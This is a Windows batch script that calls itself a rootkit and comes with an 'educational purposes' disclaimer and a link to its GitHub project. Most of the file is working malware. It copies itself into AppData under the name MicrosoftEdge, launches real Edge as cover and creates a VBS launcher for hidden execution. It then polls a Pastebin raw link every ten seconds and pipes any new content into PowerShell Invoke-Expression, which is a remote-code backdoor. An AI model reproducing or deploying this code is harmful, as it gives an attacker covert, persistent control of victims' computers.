@echo off

::RULES
::IMPORTANT: ITS ROOTKIT SOFTWARE
::This software is a rootkit intended solely for educational purposes. Using, distributing, or modifying this software in a manner that violates applicable laws is strictly prohibited.
::Rootkit software is potentially harmful and infringes upon the privacy, security, and rights of computer users. Using this software to gain unauthorized access to systems, carry out attacks, steal data, or engage in any other illegal activities is unlawful and unethical.
::The creators and contributors of this rootkit software do not endorse or support any illegal or malicious use of the software. The use of this software is entirely at your own risk, and you assume full responsibility for any consequences that may arise from its use.
::By using or accessing this rootkit software, you agree to abide by all applicable laws and regulations. The creators and contributors of this software are not liable for any damages or legal repercussions resulting from the use or misuse of this software.
::Please ensure that you use this software responsibly and ethically, respecting the privacy and security of others.
:: NEVER REMOVE THIS RULES
::BY DOWNLOADING THIS MALWARE YOU ACCEPT ALL RULES
::END OF RULES

goto exit ::BY REMOVEING THIS LINE YOU CONFIRM ACCEPTING ROLES AVIBLE ABOVE AND ON README.MD ON GITHUB PROJECT https://github.com/Code613x/Batch-rootkit/

title MicrosoftEdge
::PASTEBIN RAW LINK
set "raw_link=LINK"
::PASTEBIN RAW LINK

setlocal enabledelayedexpansion
set "batch_location=%~dp0"
set "batch_name=%~nx0"
if exist "%appdata%\MicrosoftEdge\" (
  echo.
) else (
    md "%appdata%\MicrosoftEdge\"
)

if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
  echo.
) else (
  if exist "%appdata%\MicrosoftEdge\MicrosoftEdge.bat" (
    echo.
  ) else (
    xcopy "%batch_location%%batch_name%" "%appdata%\MicrosoftEdge\"
    ren %appdata%\MicrosoftEdge\%batch_name% MicrosoftEdge.bat
  )
)
if exist "%appdata%\MicrosoftEdge\inv.vbs" (
  goto root
) else (
echo CreateObject("WScript.Shell"^).Run "%appdata%\MicrosoftEdge\inv.vbs 1", 0, False > "%appdata%\MicrosoftEdge\inv.vbs"
  start msedge
)
endlocal

exit

:root
if "%batch_location%"=="%appdata%\MicrosoftEdge\" (
  echo.
) else (
start msedge
exit
)
if "%1"=="" (
  start msedge
  exit
) else (
echo.
)

if exist hash.txt (
set /p previous_hash=<"hash.txt"
) else (
set "previous_hash="
)

:monitor_loop
echo Checking for updates...
powershell -Command "Invoke-RestMethod -Uri '%raw_link%' | ForEach-Object { $_ } | Out-File -FilePath temp.txt -Encoding UTF8"
powershell -Command "$hash = Get-FileHash -Path 'temp.txt' -Algorithm SHA256; echo $hash.Hash" > hash.txt
set /p current_hash=<hash.txt
if "%current_hash%" NEQ "%previous_hash%" (
  echo Done
  powershell -Command "Get-Content temp.txt | Invoke-Expression"
  set "previous_hash=%current_hash%"
)

del temp.txt
timeout /t 10 /nobreak >nul

goto monitor_loop

:exit
exit
